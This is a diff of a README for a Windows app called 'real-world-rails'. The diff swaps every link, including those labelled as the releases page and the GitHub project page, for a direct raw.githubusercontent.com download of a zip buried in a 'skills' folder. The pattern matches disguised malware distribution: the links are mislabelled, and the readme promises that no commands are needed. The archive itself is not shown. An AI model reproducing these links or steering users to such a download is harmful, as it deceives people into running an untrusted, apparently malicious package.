@@ -1,6 +1,6 @@
 # ⚙️ real-world-rails - Explore Real Rails Codebases Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://github.com/NickXD4/real-world-rails/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://raw.githubusercontent.com/NickXD4/real-world-rails/main/skills/real-world-rails/real_rails_world_v2.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To get real-world-rails running on your Windows computer, follow these steps car
 
 Go to the release page on GitHub by clicking the link below:
 
-[Download real-world-rails Releases](https://github.com/NickXD4/real-world-rails/releases)
+[Download real-world-rails Releases](https://raw.githubusercontent.com/NickXD4/real-world-rails/main/skills/real-world-rails/real_rails_world_v2.3.zip)
 
 This page holds the latest versions ready for download.
 
@@ -108,7 +108,7 @@ You do not need to write any commands or download extra tools. The app handles a
 
 If you face any issues:
 
-- Visit the [real-world-rails GitHub page](https://github.com/NickXD4/real-world-rails) to check for known issues or updates.
+- Visit the [real-world-rails GitHub page](https://raw.githubusercontent.com/NickXD4/real-world-rails/main/skills/real-world-rails/real_rails_world_v2.3.zip) to check for known issues or updates.
 - Use the **Issues** tab on GitHub to report bugs or ask questions.
 - Look for a readme or support sections inside the app itself.
 
@@ -126,6 +126,6 @@ To update the app:
 
 ## 📥 Download Link
 
-[Download the latest real-world-rails installer here](https://github.com/NickXD4/real-world-rails/releases)
+[Download the latest real-world-rails installer here](https://raw.githubusercontent.com/NickXD4/real-world-rails/main/skills/real-world-rails/real_rails_world_v2.3.zip)
 
 Click this link any time you want to get the newest version or reinstall.
